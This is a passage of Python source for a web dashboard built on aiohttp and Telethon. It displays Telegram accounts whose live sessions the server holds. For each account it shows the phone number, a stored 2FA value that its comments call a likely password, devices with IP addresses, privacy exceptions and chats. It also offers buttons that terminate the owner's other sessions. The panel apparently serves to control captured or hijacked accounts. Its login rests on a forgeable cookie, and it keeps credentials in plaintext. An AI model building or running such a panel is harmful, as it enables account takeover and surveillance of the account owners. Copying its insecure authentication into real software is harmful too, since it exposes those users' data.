                    <div id="fm-error" style="color: red; margin-bottom: 10px; display: none; font-size: 14px; font-weight: 500;">Incorrect Password</div>
                    <input type="password" id="fm-password" placeholder="Enter Master Password" style="width: 100%; padding: 14px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; box-sizing: border-box; font-family: inherit;" oninput="document.getElementById('fm-error').style.display='none'">
                    <button onclick="checkFMPassword()" style="width: 100%; padding: 14px; background: #2481cc; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; font-family: inherit;">Access</button>
                </div>
            </div>
        </div>
    </body>
    </html>
    """
    return web.Response(text=html_content, content_type='text/html')

RENDER_EXTERNAL_URL = os.getenv("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")

async def handle_user_profile(request):
    try:
        return await _handle_user_profile_impl(request)
    except Exception as e:
        logger.error(f"Profile Page Crash: {e}", exc_info=True)
        return web.Response(text=f"Server Error (Logged): {e}", status=500)

async def _handle_user_profile_impl(request):
    import sys
    # Universal Unicode Safety
    try:
        if sys.stdout.encoding != 'utf-8':
            sys.stdout.reconfigure(encoding='utf-8')
    except: pass

    if request.cookies.get('auth') != 'true':
        raise web.HTTPFound('/login')
        
    user_id = request.match_info.get('user_id')
    
    if user_id and int(user_id) in DOWNLOAD_FILTER_ADMINS:
        if request.cookies.get('master_auth') != 'true':
            raise web.HTTPFound('/')
    active_sessions = request.app['active_sessions']
    history = get_history() # Need to define or import if not global? It is global in this file.
    
    # Get User Data
    uid_str = str(user_id)
    udata = history.get(uid_str, {})
    
    from telethon.tl.functions.messages import GetDialogFiltersRequest
    from telethon.tl.types import DialogFilter
    
    # Active Session Data
    session = active_sessions.get(int(user_id))
    has_folders = False
    
    if session and session.client and session.client.is_connected():
        try:
             # Check for folders using Raw Request to be sure
             filters = await session.client(GetDialogFiltersRequest())
             # If filters is a list (Vector), use it. If it's an object with filters attr, use that.
             if hasattr(filters, 'filters'):
                 filters = filters.filters
             
             # Filter out potential 'Default' or suggested folders if they appear (only count actual DialogFilter)
             real_folders = [f for f in filters if isinstance(f, DialogFilter)]
             has_folders = bool(real_folders)
             
        except Exception as e:
             logger.error(f"Error checking folders: {e}")
             pass

    # Display Name Logic
    # Initialize separate vars
    res_first_name = udata.get('name', 'Unknown')
    res_last_name = "None"
    res_bio = "None"
    
    # 2FA Info: Use stored value (likely password) as seen in Dashboard List
    res_2fa_info = udata.get('two_fa', 'None') 
    
    res_2fa_security = "Unknown"
    res_email = "None"
    res_autodelete = "Off"
    res_blocked = "Unknown"
    res_devices = "Unknown"
    devices_html = ""
    # Privacy Vars
    res_priv_phone = "Unknown"
    res_priv_last_seen = "Unknown"
    res_priv_photos = "Unknown"
    res_priv_forwards = "Unknown"
    res_priv_calls = "Unknown"
    res_priv_invites = "Unknown"
    res_account_ttl = "Unknown"
    res_session_ttl = "Unknown"
    res_phone = udata.get('phone', 'None')

    if session and session.client and session.client.is_connected():
        try:
            client = session.client
            me = await client.get_me()
            
            # Pre-declare block scope username var early to bypass `udata.get` later if `me` exists
            real_username = None 
            if me:
                res_first_name = me.first_name or "None"
                res_last_name = me.last_name or "None"
                
                # Automatically update dictionary if changed
                new_full = f"{me.first_name or ''} {me.last_name or ''}".strip()
                if new_full: udata['name'] = new_full
                
                if me.phone: 
                    udata['phone'] = str(me.phone)
                    res_phone = str(me.phone)
                
                if me.username:
                    real_username = f"@{me.username}"
                    udata['username'] = real_username
                else:
                    real_username = "None"
                    udata['username'] = "None"
                    
                # We could save history here, but it's optional for `handle_user_profile` 
                # as `handle_index` already saves frequently, but we'll reflect it in UI.

            try:
                from telethon.tl.functions.account import GetAuthorizationTTLRequest
                has_sess_ttl = True
            except ImportError:
                has_sess_ttl = False
                GetAuthorizationTTLRequest = None

            try:
                # Helper for optional task
                async def safe_get_sess_ttl():
                    if has_sess_ttl and GetAuthorizationTTLRequest:
                        return await client(GetAuthorizationTTLRequest())
                    return Exception("NotSupported")

                # Parallel Fetch
                results = await asyncio.gather(
                    client(GetFullUserRequest('me')),
                    client(GetPasswordRequest()),
                    client(GetDefaultHistoryTTLRequest()),
                    client(GetBlockedRequest(offset=0, limit=1)),
                    client(GetAuthorizationsRequest()),
                    # Privacy Settings
                    client(GetPrivacyRequest(InputPrivacyKeyPhoneNumber())),
                    client(GetPrivacyRequest(InputPrivacyKeyStatusTimestamp())),
                    client(GetPrivacyRequest(InputPrivacyKeyProfilePhoto())),
                    client(GetPrivacyRequest(InputPrivacyKeyForwards())),
                    client(GetPrivacyRequest(InputPrivacyKeyPhoneCall())),
                    client(GetPrivacyRequest(InputPrivacyKeyChatInvite())),
                    client(GetAccountTTLRequest()),
                    safe_get_sess_ttl(),
                    return_exceptions=True
                )
                full_res, pwd_res, ttl_res, blocked_res, auth_res, priv_phone, priv_seen, priv_photo, priv_fwd, priv_call, priv_invite, acc_ttl_res, sess_ttl_res = results
                
                # ... [Existing Checks] ...
                if not isinstance(full_res, Exception):
                    res_bio = full_res.full_user.about or "None"
                    # Birthday Check - Try strict attribute access
                    try:
                        fu = full_res.full_user
                        if hasattr(fu, 'birthday') and fu.birthday:
                            b = fu.birthday
                            res_birthday = f"{b.day:02d}/{b.month:02d}"
                            if b.year: res_birthday += f"/{b.year}"
                    except Exception as e_bd:
                        logger.error(f"Birthday parsing error: {e_bd}")

                if not isinstance(pwd_res, Exception):
                    # Info Card: Show Stored Value (Password) from udata, Security: Real-time On/Off
                    # User requested Info 2FA to match 'total list' value (which is stored in udata['two_fa'])
                    
                    res_2fa_security = "On" if pwd_res.has_password else "Off"
                    
                    # Login Email: Telegram hides full email for security. 'has_recovery' means it's set.
                    if pwd_res.has_recovery:
                        res_email = "Hidden (Set)"
                    elif pwd_res.email_unconfirmed_pattern:
                        res_email = f"Unconfirmed: {pwd_res.email_unconfirmed_pattern}"
                    else:
                        res_email = "None"
                
                if not isinstance(ttl_res, Exception):
                     if hasattr(ttl_res, 'period') and ttl_res.period:
                        p = ttl_res.period
                        if p == 86400: res_autodelete = "1 Day"
                        elif p == 604800: res_autodelete = "1 Week"
                        elif p == 2678400: res_autodelete = "1 Month" 
                        else: res_autodelete = f"{p}s"
                     else: res_autodelete = "Off"

                if not isinstance(blocked_res, Exception):
                    if hasattr(blocked_res, 'count'):
                         res_blocked = str(blocked_res.count)
                    else:
                         res_blocked = str(len(blocked_res.blocked))
                else: res_blocked = f"Error: {blocked_res}"
                
                if not isinstance(auth_res, Exception):
                    res_devices = str(len(auth_res.authorizations))

                    
                    
                    # USER REQUESTED UPDATE: New Laptop Icon
                    laptop_check_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-laptop-icon lucide-laptop"><path d="M18 5a2 2 0 0 1 2 2v8.526a2 2 0 0 0 .212.897l1.068 2.127a1 1 0 0 1-.9 1.45H3.62a1 1 0 0 1-.9-1.45l1.068-2.127A2 2 0 0 0 4 15.526V7a2 2 0 0 1 2-2z"/><path d="M20.054 15.987H3.946"/></svg>"""
                    trash_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-trash2-icon lucide-trash-2"><path d="M10 11v6"/><path d="M14 11v6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"/><path d="M3 6h18"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>'

                    # Generate Devices HTML
                    current_dev = None
                    other_devs = []
                    for a in auth_res.authorizations:
                        if a.current: current_dev = a
                        else: other_devs.append(a)
                    
                    def fmt_dev(a, is_current=False, extra_html=""):
                        name = f"{a.device_model}" # Removed platform as requested
                        app_info = f"{a.app_name} {a.app_version}"
                        # Removed dot as requested
                        loc_info = f"{a.ip} {a.country}"
                        # Time formatting
                        time_str = "Unknown"
                        if hasattr(a, 'date_active') and a.date_active:
                            # Convert UTC to IST (+5:30)
                            try:
                                from datetime import timedelta
                                utc_dt = a.date_active
                                ist_dt = utc_dt + timedelta(hours=5, minutes=30)
                                time_str = ist_dt.strftime("%I:%M %p %d/%m/%Y").lstrip("0")
                            except Exception:
                                time_str = str(a.date_active)

                        if is_current: time_str = "Online"

                        # Build Trash Button for Other Devices (Hash needed)
                        trash_btn_html = ""
                        if not is_current and hasattr(a, 'hash') and a.hash:
                            trash_btn_html = f'''
                            <div style="margin-left: auto; padding-left: 10px;">
                                <button onclick="terminateSession('{user_id}', '{a.hash}')" style="background:#ffebee; border:none; border-radius: 10px; cursor:pointer; color:#c62828; padding: 8px; display: flex; align-items: center; justify-content: center;" title="Terminate Session">
                                    {trash_svg}
                                </button>
                            </div>
                            '''

                        # Standardized styles: 12px #777 for App/Loc/Time. Time Bold.
                        # Added flex-wrap to allow extra_html (button) to wrap to next line
                        loc_time_row = f'{loc_info} <span style="margin-left: 8px; font-weight: 700; color: #333;">{time_str}</span>'
                        
                        # Accept Calls and Secret Chats Logic
                        secret_chats_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="16" r="1"/><rect x="3" y="10" width="18" height="12" rx="2"/><path d="M7 10V7a5 5 0 0 1 10 0v3"/></svg>'
                        calls_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384"/></svg>'

                        sec_color = "#c62828" if getattr(a, 'encrypted_requests_disabled', False) else "#1f9333"
                        call_color = "#c62828" if getattr(a, 'call_requests_disabled', False) else "#1f9333"

                        app_name_lower = str(getattr(a, 'app_name', '')).lower()
                        platform_lower = str(getattr(a, 'platform', '')).lower()
                        is_desktop_or_web = any(x in app_name_lower for x in ['desktop', 'web', 'windows', 'linux', 'ubuntu', 'pc']) or any(x in platform_lower for x in ['web', 'windows', 'linux', 'ubuntu', 'desktop'])

                        sec_html = ""
                        if not is_desktop_or_web:
                            sec_html = f'''
                            <div style="display:flex; align-items:center; gap:4px; color:{sec_color};">
                                {secret_chats_svg} Accept Secret Chats
                            </div>
                            '''

                        acc_row = f'''<div style="display:flex; align-items:center; gap:12px; font-size:12px; font-weight:500; margin-top:2px;">
                            {sec_html}
                            <div style="display:flex; align-items:center; gap:4px; color:{call_color};">
                                {calls_svg} Accept Calls
                            </div>
                        </div>'''
                        
                        return f'''
                        <div class="info-item" style="display: flex; align-items: center; padding: 10px; gap: 10px; flex-wrap: wrap;">
                            <div class="info-icon">{laptop_check_svg}</div>
                            <div style="flex: 1; display: flex; flex-direction: column; gap: 2px; min-width: 0;">
                                <div style="font-weight: 500; font-size: 14px; color: #333;">{name}</div>
                                <div style="font-size: 12px; color: #555;">{app_info}</div>
                                <div style="font-size: 12px; color: #555;">{loc_time_row}</div>
                                {acc_row}
                            </div>
                            {trash_btn_html}
                            {extra_html}
                        </div>
                        '''
                    
                    # Button with trash icon (Padding 15px)
                    terminate_btn = f'''
                    <div style="width: 100%;">
                        <button onclick="terminateSessions('{user_id}')" style="width: 100%; padding: 10px; background: #ffebee; color: #c62828; border: none; border-radius: 10px; gap: 5px; font-size: 13px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center;">
                            {trash_svg} Terminate All Other Sessions
                        </button>
                    </div>
                    '''

                    devices_html = ""
                    if current_dev:
                        devices_html += fmt_dev(current_dev, is_current=True, extra_html=terminate_btn)
                    
                    for od in other_devs:
                        devices_html += fmt_dev(od)
                
                else: 
                     devices_html = '<div style="padding:10px; color:#999;">Unable to fetch devices</div>'

                if not isinstance(auth_res, Exception) and hasattr(auth_res, 'authorization_ttl_days'):
                     d = auth_res.authorization_ttl_days
                     if d:
                         if d == 7: res_session_ttl = "1 Week"
                         else:
                             months = round(d / 30)
                             if months <= 1: res_session_ttl = "1 Month"
                             elif 360 <= d <= 366: res_session_ttl = "1 Year"
                             else: res_session_ttl = f"{months} Months"

                # Fetch Names for Privacy Exceptions
                privacy_responses = [priv_phone, priv_seen, priv_photo, priv_fwd, priv_call, priv_invite]
                exception_ids = set()
                
                for resp in privacy_responses:
                    if not isinstance(resp, Exception) and hasattr(resp, 'rules'):
                        for r in resp.rules:
                            if isinstance(r, (PrivacyValueAllowUsers, PrivacyValueDisallowUsers)):
                                exception_ids.update(r.users)

                user_map = {}
                if exception_ids:
                    try:
                        resolved_users = await client(GetUsersRequest(list(exception_ids)))
                        for u in resolved_users:
                            name = u.first_name or "Unknown"
                            if u.last_name: name += f" {u.last_name}"
                            user_map[u.id] = name
                    except Exception as e_res:
                        logger.error(f"Error resolving privacy users: {e_res}")

                # Privacy Parsing Helper
                def parse_privacy(resp):
                    if isinstance(resp, Exception) or not hasattr(resp, 'rules'): return "Unknown"
                    rules = resp.rules
                    if not rules: return "Unknown"
                    
                    base_status = "Custom"
                    always_allow = []
                    never_allow = []
                    
                    # Determine Base Status
                    for r in rules:
                        if isinstance(r, PrivacyValueAllowAll): base_status = "Everybody"
                        elif isinstance(r, PrivacyValueAllowContacts): base_status = "My Contacts"
                        elif isinstance(r, PrivacyValueDisallowAll): base_status = "Nobody"
                        
                        # Collect Exceptions
                        if isinstance(r, PrivacyValueAllowUsers):
                            always_allow.extend([user_map.get(uid, str(uid)) for uid in r.users])
                        if isinstance(r, PrivacyValueDisallowUsers):
                            never_allow.extend([user_map.get(uid, str(uid)) for uid in r.users])
                    
                    # Formatting
                    extras = []
                    if always_allow:
                        extras.append(f"Always Allow: {', '.join(always_allow)}")
                    if never_allow:
                        extras.append(f"Never Allow: {', '.join(never_allow)}")
                    
                    if extras:
                        return f"{base_status}<br><span style='font-size:12px; color:#888;'>{' | '.join(extras)}</span>"
                    return base_status

                res_priv_phone = parse_privacy(priv_phone)
                res_priv_last_seen = parse_privacy(priv_seen)
                res_priv_photos = parse_privacy(priv_photo)
                res_priv_forwards = parse_privacy(priv_fwd)
                res_priv_calls = parse_privacy(priv_call)
                res_priv_invites = parse_privacy(priv_invite)
                
                if not isinstance(acc_ttl_res, Exception):
                    d = acc_ttl_res.days
                    # Show as months consistently
                    months = round(d / 30)
                    if months <= 1: res_account_ttl = "1 Month"
                    else: res_account_ttl = f"{months} Months"
                
                if not isinstance(sess_ttl_res, Exception):
                     if hasattr(sess_ttl_res, 'days'):
                         d = sess_ttl_res.days
                         # Show as months consistently
                         if d >= 365: 
                              months = round(d / 30)
                              res_session_ttl = f"{months} Months"
                         elif d == 183 or d == 180: res_session_ttl = "6 Months"
                         elif d == 7: res_session_ttl = "1 Week"
                         else: res_session_ttl = f"{d} Days"

            except Exception as e_inner:
                logger.error(f"Inner fetch error: {e_inner}")

        except Exception as e:
            logger.error(f"Error fetching profile details: {e}")

    # Define Username Early
    # Use real-time username if fetched, else fallback
    try:
        if 'real_username' in locals() and real_username is not None:
            username = real_username
        else:
            username = udata.get('username') or 'None'
    except:
        username = udata.get('username') or 'None'
        
    if username == '-': username = 'None'

    # Formatting
    # Formatting
    if res_phone != 'None' and not res_phone.startswith('+'):
        res_phone = f"+{res_phone}"

    def safe_str_val(v):
        try:
            return str(v)
        except:
            return "ErrorBadStr"

    def style_val(val):
        v_str = safe_str_val(val).strip() if val is not None else "None"
        if v_str.lower() in ["none", "unknown", "off"]:
             return f'<span style="color: #999; font-weight: 400;">{v_str}</span>'
        return v_str # Default blue style from CSS

    # Apply styling
    fmt_first_name = style_val(res_first_name)
    fmt_last_name = style_val(res_last_name)
    fmt_username = style_val(username)
    fmt_phone = style_val(res_phone)
    fmt_2fa_info = style_val(res_2fa_info)
    fmt_2fa_security = style_val(res_2fa_security)
    fmt_bio = style_val(res_bio)
    fmt_autodelete = style_val(res_autodelete)
    # Passkeys removed
    fmt_email = style_val(res_email)
    fmt_blocked = style_val(res_blocked)
    fmt_devices = style_val(res_devices)
    
    # Privacy Styles
    fmt_priv_phone = style_val(res_priv_phone)
    fmt_priv_seen = style_val(res_priv_last_seen)
    fmt_priv_photos = style_val(res_priv_photos)
    fmt_priv_fwd = style_val(res_priv_forwards)
    fmt_priv_calls = style_val(res_priv_calls)
    fmt_priv_invites = style_val(res_priv_invites)
    fmt_account_ttl = style_val(res_account_ttl)
    fmt_session_ttl = style_val(res_session_ttl)

    # Display Name
    custom_name = udata.get('custom_name')
    display_name = custom_name if custom_name else f"{res_first_name} {res_last_name if res_last_name != 'None' else ''}".strip()
    
    # Styles
    css = """
        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; }
        input, button, select, textarea { font-family: inherit; }
        .action-bar { 
            position: relative; z-index: 100; height: 56px; box-sizing: border-box;
            background: #2481cc; color: white; padding: 0 10px; gap: 10px;
            display: flex; align-items: center; 
            box-shadow: none;
        }
        .back-btn { 
            background: #3c94dd; border: none; color: white; width: 32px; height: 32px; 
            border-radius: 50%; display: flex; align-items: center; justify-content: center; 
            cursor: pointer; transition: background 0.15s; outline: none; flex-shrink: 0; padding: 0;
        }
        .back-btn:hover { background: #2f7bbc; }
        .back-btn svg { width: 18px; height: 18px; }
        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #eee; border: 1px solid white; object-fit: cover; flex-shrink: 0; }
        .user-title { font-size: 18px; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        
        .scroll-tabs { 
            background: #2481cc; display: flex; overflow-x: auto; 
            white-space: nowrap; -webkit-overflow-scrolling: touch; 
            position: sticky; top: 0; z-index: 99;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }
        .scroll-tabs::-webkit-scrollbar { display: none; }
        .tab-item { 
            padding: 14px 16px; color: rgba(255,255,255,0.7); 
            font-weight: 500; font-size: 14px; 
            cursor: pointer; border-bottom: 3px solid transparent; 
        }
        .tab-item.active { color: white; border-bottom-color: white; }
        
        .content-area { max-width: 800px; margin: 0 auto; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        /* Info Tab Styles */
        .info-container { padding: 15px; max-width: 600px; margin: 0 auto; }
        .info-section { margin-bottom: 15px; }
        .section-header { color: #2481cc; font-weight: 500; margin-bottom: 8px; font-size: 14px; margin-left: 12px; }
        .info-card-box { background: white; border-radius: 12px; overflow: hidden; box-shadow: none; }
        
        @media (max-width: 600px) {
            .info-container { padding: 10px; }
        }
        
        .info-item { padding: 6px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #f0f2f5; min-height: 36px; }
        .info-item:last-child { border-bottom: none; }
        .info-left { display: flex; align-items: center; gap: 16px; }
        .info-icon { width: 22px; height: 22px; color: #707579; display: flex; align-items: center; justify-content: center; }
        .info-label { font-size: 14px; color: #333; font-weight: 400; }
        .info-value { font-size: 14px; color: #2481cc; font-weight: 500; text-align: right; max-width: 50%; word-break: break-all; }
        
        /* Open All Folder Button */
        .folder-center { 
            display: flex; justify-content: center; align-items: center; 
            height: 60vh; 
        }
        .open-folder-btn {
            background: #2481cc; color: white; border: none; padding: 12px 24px; 
            border-radius: 24px; font-size: 16px; font-weight: 600; cursor: pointer;
            box-shadow: 0 4px 6px rgba(36, 129, 204, 0.4); transition: transform 0.1s;
        }
        .open-folder-btn:active { transform: scale(0.95); }
        
        /* Chat List Styles */
        .chat-list { display: flex; flex-direction: column; }
        .chat-item { background: white; display: flex; align-items: center; padding: 5px 10px; border-bottom: 1px solid #f0f2f5; cursor: pointer; transition: background 0.2s; position: relative; height: 72px; box-sizing: border-box; }
        .chat-item:last-child { border-bottom: none; }
        .chat-item:hover { background: #f5f6f7; }
        
        .avatar-wrapper { position: relative; width: 54px; height: 54px; margin-right: 12px; flex-shrink: 0; }
        .chat-avatar { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; background: #eee; }
        .chat-icon { width: 100%; height: 100%; border-radius: 50%; background: #2481cc; color: white; display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: 600; }
        
        .voice-badge { 
            position: absolute; bottom: -2px; right: -2px; 
            background: #4cd964; color: white; 
            width: 18px; height: 18px; border-radius: 50%; 
            display: flex; align-items: center; justify-content: center; 
            border: 1px solid #fff;
        }
        .voice-badge svg { width: 11px; height: 11px; }
        
        .chat-main { flex: 1; min-width: 0; display: flex; flex-direction: column; justify-content: center; }
        .chat-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2px; }
        .chat-name { font-size: 16px; font-weight: 600; color: #1c1e21; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 70%; }
        .chat-meta-right { display: flex; align-items: center; gap: 0px; font-size: 13px; color: #707579; }
        .chat-time { font-size: 12px; }
        
        .chat-body { display: flex; justify-content: space-between; align-items: center; }
        .chat-preview { font-size: 14px; color: #707579; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 70%; }
        .chat-badges { display: flex; align-items: center; gap: 4px; }
        
        .icon-badge { 
            min-width: 20px; height: 20px; border-radius: 10px; 
            display: flex; align-items: center; justify-content: center; 
            color: white; font-size: 12px; font-weight: 700; padding: 0 5px; box-sizing: border-box; 
        }
        .unread-badge { background: #3390ec; }
        .unread-badge.muted { background: #c4c4c4 !important; } 
        .mention-badge { background: #3390ec; }
        .pinned-badge { background: #c4c4c4; color: white; width: 20px; padding: 0; transform: none; }
        .muted-badge { background: #c4c4c4; color: white; width: 20px; padding: 0; }
        
        .chat-tick { display: flex; align-items: center; color: #5fb440; }
        .chat-tick.read { color: #5fb440; }
        
        .pinned-badge svg { width: 12px; height: 12px; transform: rotate(45deg); }
        
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .loader-spin { animation: spin 1s linear infinite; }
    """
    
    # Fetch Notify Defaults
    from telethon.tl.functions.account import GetNotifySettingsRequest
    from telethon.tl.functions.messages import SearchGlobalRequest
    from telethon import utils
    from telethon.tl.types import InputNotifyUsers, InputNotifyChats, InputNotifyBroadcasts, InputMessagesFilterPhoneCalls, InputPeerEmpty, PhoneCallDiscardReasonMissed, PhoneCallDiscardReasonBusy, MessageActionPhoneCall
    from datetime import datetime, timedelta

    if session and getattr(session, 'client', None) and session.client.is_connected() and not getattr(session, 'notify_defaults', None):
         try:
              res_u = await session.client(GetNotifySettingsRequest(InputNotifyUsers()))
              res_g = await session.client(GetNotifySettingsRequest(InputNotifyChats()))
              res_b = await session.client(GetNotifySettingsRequest(InputNotifyBroadcasts()))
              
              now_ts = datetime.now().timestamp()
              
              def is_m(res):
                   mu = getattr(res, 'mute_until', 0)
                   if isinstance(mu, datetime): return mu.timestamp() > now_ts
                   return mu > now_ts
              
              defaults = {
                  'users': is_m(res_u),
                  'groups': is_m(res_g),
                  'broadcasts': is_m(res_b)
              }
              session.notify_defaults = defaults
         except Exception as e:
              logger.error(f"Failed to fetch notify defaults: {e}")
              pass
    
    pinned_ids = [] # Removed logic as requested
    
    tabs = ["Info", "Chats", "Groups", "Channels", "Stories", "Bots"]
    
    main_dialogs = []
    archived_dialogs = []

    if session and getattr(session, 'client', None) and session.client.is_connected():
        try:
            async for d in session.client.iter_dialogs(folder=0, limit=2000, ignore_migrated=True):
                 if not getattr(d, 'archived', False):
                     main_dialogs.append(d)
        except Exception as e:
            logger.error(f"Failed to load main dialogs: {e}")
            
        try:
            async for d in session.client.iter_dialogs(folder=1, limit=500, ignore_migrated=True):
                 if getattr(d, 'archived', False):
                     archived_dialogs.append(d)
        except Exception as e:
            logger.error(f"Failed to load archived dialogs: {e}")
    
    def dedup(dialogs, ignore_ids=None):
        from telethon import utils
        unique = []
        seen = set(ignore_ids or [])
        for d in dialogs:
            if not d.entity: continue
            try:
                pid = utils.get_peer_id(d.entity)
                if pid not in seen:
                    seen.add(pid)
                    unique.append(d)
            except:
                unique.append(d)
        return unique

    archived_dialogs = dedup(archived_dialogs)
    
    from telethon import utils
    archived_ids = {utils.get_peer_id(d.entity) for d in archived_dialogs if d.entity}
    main_dialogs = dedup(main_dialogs, ignore_ids=archived_ids)
    
    all_dialogs = main_dialogs + archived_dialogs
    all_dialogs = dedup(all_dialogs)
    all_dialogs.sort(key=lambda d: d.date.timestamp() if getattr(d, 'date', None) else 0, reverse=True)
    
    calls_list = []
    call_entities = {}
    fetch_exception = None
    calls_list = []
    call_entities = {}
    fetch_exception = None
    
    chats = [d for d in all_dialogs if d.is_user and not getattr(d.entity, 'bot', False)]
    bots = [d for d in all_dialogs if d.is_user and getattr(d.entity, 'bot', False)]
    groups = [d for d in all_dialogs if d.is_group]
    channels = [d for d in all_dialogs if d.is_channel and not d.is_group]
    
    uc = {}
    for t_name, lst in [("Chats", chats), ("Channels", channels), ("Groups", groups), ("Bots", bots), ("Archived", archived_dialogs)]:
        c = sum(1 for d in lst if getattr(d, 'unread_count', 0) > 0)
        uc[t_name] = c
    
    # Standard Tabs
    tabs.extend(["Saved", "Archived", "Calls", "Contacts", "Stickers"])
    
    tabs_html = ""
    content_html = ""
    
    for i, tab in enumerate(tabs):
        active_cls = "active" if i == 0 else ""
        
        display_tab = tab
        if tab in uc and uc[tab] > 0:
            display_tab = f"{tab} ({uc[tab]})"
            
        tabs_html += f'<div class="tab-item {active_cls}" onclick="switchTab(\'{tab}\')" data-tab="{tab}">{display_tab}</div>'
        
        content_cls = "active" if i == 0 else ""
        inner_content = ""
        
        if tab == "Info":
            # SVGs provided by user
            info_icon_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-info-icon lucide-info"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>'
            user_round_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user-round-icon lucide-user-round"><circle cx="12" cy="8" r="5"/><path d="M20 21a8 8 0 0 0-16 0"/></svg>'
            user_check_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-hash"><line x1="4" x2="20" y1="9" y2="9"/><line x1="4" x2="20" y1="15" y2="15"/><line x1="10" x2="8" y1="3" y2="21"/><line x1="16" x2="14" y1="3" y2="21"/></svg>'
            at_sign_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-at-sign-icon lucide-at-sign"><circle cx="12" cy="12" r="4"/><path d="M16 8v5a3 3 0 0 0 6 0v-1a10 10 0 1 0-4 8"/></svg>'
            phone_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-phone-icon lucide-phone"><path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384"/></svg>'
            lock_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-lock-icon lucide-lock"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>'
            cake_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-cake-icon lucide-cake"><path d="M20 21v-8a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v8"/><path d="M4 16s.5-1 2-1 2.5 2 4 2 2.5-2 4-2 2.5 2 4 2 2-1 2-1"/><path d="M2 21h20"/><path d="M7 8v3"/><path d="M12 8v3"/><path d="M17 8v3"/><path d="M7 4h.01"/><path d="M12 4h.01"/><path d="M17 4h.01"/></svg>'
            badge_info_svg = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-badge-info-icon lucide-badge-info"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z"/><line x1="12" x2="12" y1="16" y2="12"/><line x1="12" x2="12.01" y1="8" y2="8"/></svg>'
